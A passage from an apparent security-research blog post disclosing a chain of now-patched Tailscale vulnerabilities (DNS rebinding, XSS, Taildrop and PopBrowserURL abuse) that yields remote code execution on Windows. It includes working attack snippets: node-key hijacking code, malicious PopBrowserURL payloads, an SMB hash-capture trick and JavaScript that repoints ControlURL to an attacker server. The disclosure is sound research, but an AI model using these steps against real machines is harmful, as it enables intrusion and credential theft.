<span class="token keyword">for</span> line <span class="token keyword">in</span> sys<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span><span class="token builtin">buffer</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">match</span> <span class="token operator">:=</span> r<span class="token punctuation">.</span>search<span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token keyword">match</span> <span class="token keyword">not</span> <span class="token keyword">in</span> seen<span class="token punctuation">:</span>
            subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">[</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"-n"</span> <span class="token string">"meow"</span><span class="token punctuation">,</span> <span class="token string">"nodes"</span><span class="token punctuation">,</span> <span class="token string">"register"</span><span class="token punctuation">,</span> <span class="token string">"--key"</span><span class="token punctuation">,</span> <span class="token keyword">match</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
            seen<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token keyword">match</span><span class="token punctuation">)</span>

    sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span><span class="token builtin">buffer</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>line<span class="token punctuation">)</span></pre></div></details></p>

<p>Once the machine has rebooted and joined, we can access any network services the
machine runs. While we&#39;re setting preferences through the LocalAPI, we can also
configure the machine to act as an Exit Node, letting us access any other
services on the same physical network as the targeted machine.</p>
<p>This sounds like a highly effective attack, as it gives us a position from which
to move laterally within the target&#39;s traditional network, without running
malicious code on the machine (except for the one-off Javascript to reconfigure
<code>tailscaled</code>) – Tailscale is acting as a LOLBin, proxying us into the network.</p>
<p>In practice, access to the local network may not be as exciting a prospect
against a Tailscale user as it would against nearly any other target. If they&#39;ve
fully bought in to the Tailscale way of doing things, there probably isn&#39;t
anything particularly juicy sitting around unfirewalled on the traditional
private network.</p>
<h2 id="popbrowserur_shell_"><a class="anchor" aria-hidden="true" tabindex="-1" href="#popbrowserur_shell_"><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>PopBrowserUR_Shell_</h2><p>In theory, there is no path for a malicious Tailscale control plane to remotely
execute code on your machine, unless you happen to run network services that are
designed to allow it, like an
<a href="https://tailscale.com/kb/1193/tailscale-ssh/" title="null" rel="noopener noreferrer">SSH server with Tailscale-backed authentication</a>.
In practice:</p>
<figure><iframe style="width:100%;height:auto;aspect-ratio:1240/775;" width="1240" height="775" src="https://www.youtube.com/embed/2OFCC7wuvQI" title="RCE from Malicious Tailscale Control Plane" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe><figcaption><center><i>aarch64 Windows doesn't have <tt>calc.exe</tt>; please accept this notepad-popping as a meager substitute</i></center></figcaption></figure>

<p><code>tailscaled</code> is constantly long-polling the control plane, waiting for updates
to the layout of your network. Sometimes, when you want to perform a privileged
action, like SSHing to a locked-down server, Tailscale will ask you to
re-authenticate yourself, by including a <code>PopBrowserURL</code> field in the response.</p>
<div class="issue-panel">

<h3 id="issue-2---control-plane-can-trigger-code-execution"><a class="anchor" aria-hidden="true" tabindex="-1" href="#issue-2---control-plane-can-trigger-code-execution"><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>Issue 2 - Control plane can trigger code execution</h3><p><em>Resolved in <code>1.32.3</code> through URL filtering</em></p>
</div>

<p>The daemon forwards this URL to the GUI, whose job is to open it in a web
browser. The specifics of how this is implemented are unclear, as the GUI
component is closed-source, and reverse-engineering Go binaries is about as fun
as pulling teeth from an adorable blue gopher. Suffice to say it is implemented
sub-optimally, as it allows the control plane to push out arbitrary paths for
files to open.</p>
<p>How can we go from &quot;open any path&quot; to &quot;execute any code&quot;? Windows can open
executables directly from WebDAV servers, which seems promising! If we push out
the URL <code>\\live.sysinternals.com\tools\Procmon64.exe</code>, Tailscale will download
and launch Procmon, but the user will be prompted before the program launches,
as the downloaded file bears the Mark of the Web:</p>
<p><img src="/posts/tailscale/motw.jpg" alt="Windows popup: We can&#39;t verify who created this file. Are you sure you want to run this file?" title="" /></p>
<p>We can use another Tailscale feature to bypass the need for user interaction.
Taildrop is a super-convenient feature, providing a UI to send files between
devices owned by the same user on a tailnet. Taildrop can be enabled/disabled by
the tailnet administrator, and it is off by default. Unfortunately, ever since
your <code>ControlURL</code> was changed to point to a malicious server, your tailnet
administrator has not been someone with your best interests at heart.</p>
<p><img src="/posts/tailscale/tailscale-website.jpg" alt="Tailscale marketing screenshot: &quot;Taildrop by Tailscale is the simplest way to send files to any of your devices, anywhere. A safe private network that just works.&quot;" title="" /></p>
<div class="issue-panel">

<h3 id="issue-3---taildrop-does-not-apply-mark-of-the-web"><a class="anchor" aria-hidden="true" tabindex="-1" href="#issue-3---taildrop-does-not-apply-mark-of-the-web"><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>Issue 3 - Taildrop does not apply Mark of the Web</h3><p><em>Resolved in <code>1.32.3</code> (MOTW and <code>com.apple.quarantine</code> applied)</em></p>
</div>

<p>From another machine on the Headscale tailnet, we can Taildrop an arbitrary
executable which will land on the victim&#39;s desktop. This file is not tainted
with the Mark of the Web, so Tailscale will be able to launch it without user
interaction. All we need to do is find it:</p>
<div class="highlight highlight-source-javascript notranslate"><pre><span class="token string-property property">"PopBrowserURL"</span><span class="token operator">:</span> <span class="token string">"C:\Users\___🤷‍♀️___\Desktop\malware.exe"</span></pre></div><p>Perhaps it is possible to guess the target&#39;s Windows username from their email
address, which we learned from rebinding to the LocalAPI <code>status</code> endpoint
earlier. Perhaps the target is sitting on a network with an unauthenticated LDAP
server, which we can bind to and enumerate usernames, using the victim as an
Exit Node. There is a solution which applies much more generally, and like so
much of Windows, it&#39;s remarkably cursed:</p>
<p>To learn the target&#39;s username, we must first learn their password.</p>
<div class="highlight highlight-source-javascript notranslate"><pre><span class="token string-property property">"PopBrowserURL"</span><span class="token operator">:</span> <span class="token string">"\\100.64.0.1"</span></pre></div><p><img src="/posts/tailscale/responder.png" alt="Screenshot from Responder, showing an NTLMv2-SSP Hash for Jamie received over SMB from 100.64.0.2" title="" /></p>
<p>We can ask Tailscale to open a path on an SMB share. Windows being Windows, it
will send your username (and a hash of your login password) to this server,
unprompted, despite having no reason to consider the server trustworthy.</p>
<p>Since we can make the SMB connection over Tailscale, we bypass any network-level
egress filtering of SMB connections, which appears to be a commonly-recommended
mitigation against this class of attack.</p>
<p>Now the Windows username is known, we can fill in the blank, and trigger
execution of our code:</p>
<div class="highlight highlight-source-javascript notranslate"><pre><span class="token string-property property">"PopBrowserURL"</span><span class="token operator">:</span> <span class="token string">"C:\Users\jamie\Desktop\malware.exe"</span></pre></div><h3 id="demo-time"><a class="anchor" aria-hidden="true" tabindex="-1" href="#demo-time"><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>Demo Time</h3><iframe style="width:100%;height:auto;aspect-ratio:1240/775;" width="1240" height="775" src="https://www.youtube.com/embed/rnTk1Cz6yuw" title="RCE from Malicious Tailscale Control Plane" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

<p>Having discovered these three bugs, which we believed could be chained for RCE
against any Windows Tailscale user, we were content. All that was left was to
polish our demo. To do so, we first moved the server hosting the
proof-of-concept from a local machine to one in the cloud. A quick re-test in
Chrome, and...</p>
<p><img src="/posts/tailscale/pna.png" alt="Chrome developer console message: Access to fetch at &#39;http://s-35.185.206.165-127.0.0.1-100042828-fs-e.d.rebind.it/&#39; from origin &#39;http://s-35.185.206.165-127.0.0.1-100042828-fs-e.d.rebind.it&#39; has been blocked by CORS policy: The request client is not a secure context and the resource is in more-private address space `local`." title="" /></p>
<p>None of these words are in the Bible.</p>
<p>This is certainly true of the King James Version, but many of these words can be
found in what might as well be the Old Testament of Same-Origin Policy: the
<a href="https://fetch.spec.whatwg.org/" title="null" rel="noopener noreferrer">WhatWG Fetch Standard</a>, which defines the CORS
rules we are being accused of violating.</p>
<p>The Fetch Standard certainly does <em>not</em> define a way for a request targeting the
same domain, protocol, and port as the requesting webpage to be considered
Cross-Site. Apparently, at some point in the past 2<del>022</del> years, a whole new
standard came about:</p>
<blockquote>
<p><del>Judge not according to the appearance, but judge righteous judgment</del> <del>--
John 7:24</del></p>
</blockquote>
<blockquote>
<p>The mitigation described here operates upon the IP address which the user
agent actually connects to when loading a particular resource. This check MUST
be performed for each new connection made, as DNS rebinding attacks may
otherwise trick the user agent into revealing information it shouldn’t. --
<a href="https://wicg.github.io/private-network-access/#dns-rebinding" title="null" rel="noopener noreferrer">WICG Private Network Access Standard §5.3 DNS Rebinding</a></p>
</blockquote>
<h2 id="dns-rebinding-is-dead"><a class="anchor" aria-hidden="true" tabindex="-1" href="#dns-rebinding-is-dead"><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>DNS Rebinding is Dead</h2><p>The effect of this policy, as currently implemented in Chrome and Edgium,
appears to be that a site hosted in public IP address space cannot rebind to one
hosted in private IP space. When the proof-of-concept was hosted at
<code>192.168.1.172</code>, we could attack all browsers just fine, but as soon as we moved
it to the internet, these mitigations worked their mitigatory magic.</p>
<p>Firefox does not implement PNA, and is fully exploitable over the public
internet using the bugs described above.</p>
<p>The IP addresses considered private by PNA are:</p>
<ul>
<li><code>127.0.0.0/8</code>; the IPv4 loopback space</li>
<li><code>10.0.0.0/8</code>, <code>172.16.0.0/12</code>, and <code>192.168.0.0/16</code>; the RFC1918 IPv4 spaces;</li>
<li><code>169.254.0.0/16</code>; the IPv4 link-local space</li>
<li>The IPv6-mapped versions of the above</li>
<li><code>::1/128</code>; the IPv6 loopback space</li>
<li><code>fc00::/7</code>; the IPv6 Unique Local Address space</li>
<li><code>fe80::/10</code>; the IPv6 link-local unicast space</li>
</ul>
<p>IPv6 tailnet addresses are chosen from the <code>fc00::/7</code> space, so the attack
should be usable for lateral movement within a tailnet against users. Notably,
this strategy does not require an ACL which allows traffic to <code>:41112</code> on the
attacker&#39;s machine, due to the
<a href="https://pulsesecurity.co.nz/articles/some-tailscale-tricks" title="null" rel="noopener noreferrer">ability to opt out of the firewall</a>
previously discussed by Pulse Security.</p>
<p>Using issues 1-3, this gives us:</p>
<table>
<thead>
<tr>
<th align="right"></th>
<th>Windows+Firefox</th>
<th>Windows+Chrome</th>
<th align="left">Non-Windows</th>
</tr>
</thead>
<tbody><tr>
<td align="right"><strong>No special access</strong></td>
<td>Exploitable</td>
<td>Unexploitable? (PNA)</td>
<td align="left">Not vulnerable</td>
</tr>
<tr>
<td align="right"><strong>Same local network</strong></td>
<td>Exploitable</td>
<td>Exploitable</td>
<td align="left">Not vulnerable</td>
</tr>
<tr>
<td align="right"><strong>Same Tailnet</strong></td>
<td>Exploitable</td>
<td>Exploitable</td>
<td align="left">Not vulnerable</td>
</tr>
</tbody></table>
<p>We just mentioned that IPv6 tailnet addresses are private.</p>
<p>IPv4 Tailscale addresses are not from RFC1918. They are not link-local, and they
are certainly not loopback. IPv4 Tailscale addresses are RFC6598 CGNAT
addresses, from the <code>100.64.0.0/10</code> space, a space that is <strong>not considered
private by Chrome!</strong></p>
<h2 id="long-live-dns-rebinding"><a class="anchor" aria-hidden="true" tabindex="-1" href="#long-live-dns-rebinding"><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>Long Live DNS Rebinding</h2><p>Tailscaled runs a web server at 100.100.100.100. This is all it does:</p>
<p><img src="/posts/tailscale/quad100.png" alt="The page 100.100.100.100, open in Chrome: &quot;Tailscale. Local Addresses: 100.109.225.113, fd7a:(rest of v6 address)&quot;" title="" /></p>
<div class="issue-panel" style="padding-bottom: 10px">

<h3 id="issue-4---quad100-vulnerable-to-dns-rebinding"><a class="anchor" aria-hidden="true" tabindex="-1" href="#issue-4---quad100-vulnerable-to-dns-rebinding"><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>Issue 4 - Quad100 vulnerable to DNS Rebinding</h3><p><em>Resolved in <code>1.32.3</code> (<code>Host</code> header allowlist implemented)</em></p>
</div>

<p>It ain&#39;t much, but it&#39;s rebindable, and it lets us learn the target&#39;s Tailnet IP
address. And unlike the LocalAPI, this one works everywhere, not just Windows!</p>
<p>Hey, what&#39;s this?</p>
<p><img src="/posts/tailscale/peerapi.png" alt="" title="" /></p>
<p>This is the <strong>PeerAPI</strong>. It&#39;s an API exposed over HTTP, on a
<a href="https://github.com/tailscale/tailscale/blob/7c285fe7ee67ae6a986fc543d1a28beda4db7462/ipn/ipnlocal/peerapi.go#L425-L444" title="null" rel="noopener noreferrer">predictable port</a>,
to other nodes on the Tailnet. It&#39;s not used for the core functionality of
Tailscale, but for additional features, like Taildrop, as well as for some
<a href="https://pulsesecurity.co.nz/articles/some-tailscale-tricks" title="null" rel="noopener noreferrer">introspection functionality</a>.</p>
<div class="issue-panel">

<h3 id="issue-5---peerapi-vulnerable-to-dns-rebinding"><a class="anchor" aria-hidden="true" tabindex="-1" href="#issue-5---peerapi-vulnerable-to-dns-rebinding"><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>Issue 5 - PeerAPI vulnerable to DNS Rebinding</h3><p><strong>CVE</strong>: CVE-2022-41925<br> <strong>Advisory</strong>:
<a href="https://tailscale.com/security-bulletins/#ts-2022-005" title="null" rel="noopener noreferrer">TS-2022-005</a>
<br> <em>Resolved in <code>1.32.3</code> (<code>Host</code> header allowlist, introspection locked down)</em></p>
</div>

<p>What address space is it in? That&#39;s right, tailnet address space! We can rebind
to Quad100, learn the target&#39;s tailnet address, calculate their PeerAPI port,
rebind to <em>that</em>, dump their environment variables, learn about their other
tailnet devices, and send them files via Taildrop.</p>
<h3 id="how-taildrop-works"><a class="anchor" aria-hidden="true" tabindex="-1" href="#how-taildrop-works"><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>How Taildrop Works</h3><ol>
<li>When I want to send a file to one of my fellow Tailscale nodes, I connect to
its PeerAPI, and PUT a file to <code>/v0/put/$filename-of-my-choosing</code>.</li>
<li><code>tailscaled</code> stores this file in a temporary location. On Windows, that&#39;s
<code>C:\ProgramData\Tailscale\files\$email-uid-$uid\$filename-of-my-choosing</code>.</li>
<li><code>tailscaled</code> informs the GUI that a new file has arrived</li>
<li>The GUI fetches the file from <code>tailscaled</code> through a GET request to the
LocalAPI, and saves it to the desktop.</li>
<li>The LocalAPI GET request is served with <code>Content-Type: text/html</code>.</li>
</ol>
<p><img src="/posts/tailscale/gru.jpg" alt="" title="" /></p>
<div class="issue-panel">

<h3 id="issue-6-cross-site-scripting-in-localapi"><a class="anchor" aria-hidden="true" tabindex="-1" href="#issue-6-cross-site-scripting-in-localapi"><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>Issue 6: Cross-Site Scripting in LocalAPI</h3><p><em>Resolved in <code>1.32.3</code> through <code>Content-Type</code> fix, <code>Content-Security-Policy</code>, and
request header checks</em></p>
</div>

<p>Exploiting this XSS issue in practice requires some trickery. As part of
handling the LocalAPI GET request, tailscaled will delete the file from the
temporary directory, since it has now been moved to its final location. This
happens automatically, so we would need to win a race against the GUI to load
our HTML before it is destroyed.</p>
<p>Instead, we discovered that if we upload multiple files with the same name to in
parallel, the various threads will fight over the shared filename, and some of
the requests will end up failing, meaning that the file never gets deleted. We
can load the HTML in an <code>iframe</code>, which is not prohibited by PNA:</p>
<div class="highlight highlight-source-html notranslate"><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://127.0.0.1:41112/localapi/v0/files/evil.html<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span></pre></div><p>Now our Javascript is running in a true LocalAPI origin, we gain equivalent
access to what we got from Issue 1, but without Chromium&#39;s pesky security
features getting in the way.</p>
<p>The path to RCE from here is the same as earlier, but with an extra little bit
of polish now available. On the very same day we discovered the XSS
vulnerability, the first commits of a new feature were trickling into the <code>main</code>
branch of the Tailscale GitHub repo.
<a href="https://github.com/tailscale/tailscale/issues/713#issuecomment-1320546602" title="null" rel="noopener noreferrer">Fast User Switching</a>
(work in progress, not yet available in a released Tailscale version) allows
Tailscale to switch between multiple accounts without logging out and logging in
from scratch. As part of this, tailscaled may need to switch to another control
plane server, without manually being restarted! We can use this feature to have
our target machine join the Headscale tailnet in just a few seconds, no reboot
required:</p>
<div class="highlight highlight-source-javascript notranslate"><pre><span class="token keyword">let</span> id <span class="token operator">=</span>
  <span class="token punctuation">(</span><span class="token keyword">await</span> <span class="token punctuation">(</span><span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">"/localapi/v0/profiles/current"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">"GET"</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token constant">ID</span><span class="token punctuation">;</span>
<span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">"/localapi/v0/prefs"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
  <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">"PATCH"</span><span class="token punctuation">,</span>
  <span class="token literal-property property">body</span><span class="token operator">:</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    <span class="token literal-property property">ControlURL</span><span class="token operator">:</span> <span class="token string">"http://1.2.3.4:8080"</span><span class="token punctuation">,</span>
    <span class="token literal-property property">ControlURLSet</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">"/localapi/v0/profiles/"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">"PUT"</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">"/localapi/v0/profiles/"</span> <span class="token operator">+</span> id<span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">"POST"</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></div><h3 id="demo-time-again"><a class="anchor" aria-hidden="true" tabindex="-1" href="#demo-time-again"><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>Demo Time, Again</h3><p>By chaining issues 4, 5, 6, 2, and 3; we can finally achieve RCE against Chrome
users over the public internet:</p>
<iframe style="width:100%;height:auto;aspect-ratio:1240/775;" width="1240" height="775" src="https://www.youtube.com/embed/3UIj4YX3qAE" title="RCE from Malicious Tailscale Control Plane" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

<h1 id="issue-7-your-service-here-vulnerable-to-dns-rebinding"><a class="anchor" aria-hidden="true" tabindex="-1" href="#issue-7-your-service-here-vulnerable-to-dns-rebinding"><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>Issue 7: <u>Your service here</u> vulnerable to DNS rebinding?</h1><p>Tailscale&#39;s documentation tends to encourage a model wherein web services are
published to the Tailnet over unencrypted HTTP, and authentication based solely
on network position, whether implicitly (services lacking authentication) or
explicitly (identifying the user with <code>whois</code> requests).</p>
<p>While we have not undertaken in-depth research here, we suspect that real-world
Tailscale deployments have many high-impact rebindable web services.</p>
<p>Let&#39;s compare the Tailscale approach to two alternative models, in the context
of DNS rebinding attacks:</p>
<h3 id="beyondcorp-style-https-access-proxies"><a class="anchor" aria-hidden="true" tabindex="-1" href="#beyondcorp-style-https-access-proxies"><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>BeyondCorp-style HTTPS access proxies</h3><p>DNS Rebinding attacks generally don&#39;t work against HTTPS services: if the
target&#39;s browser loads
<code>https://toggle-between-attacker-and-webmail.attacker.com</code> and reaches out to
the legitimate webmail server, it will be presented with a TLS certificate which
does not match the rebound domain, and will throw a certificate error.</p>
